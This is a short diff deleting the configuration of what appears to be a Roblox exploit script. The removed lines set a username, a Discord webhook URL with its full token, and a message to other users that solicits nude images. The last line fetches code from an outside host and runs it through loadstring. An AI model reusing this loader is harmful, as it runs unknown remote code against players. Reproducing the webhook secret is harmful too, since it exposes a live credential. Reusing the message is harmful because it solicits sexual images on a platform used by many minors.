@@ -1,5 +1,0 @@
-Username = "chanixmobiles"
-MailMessage = "dm me and send nudes"
-Webhook = "https://discord.com/api/webhooks/1240152704718864455/zxCt_TL-yOW4U5kOQWqRCRWou0Azz3jOrVvzEbY3oGxZXZgBjx133APbT-24uuTsxqg7"
-
-loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
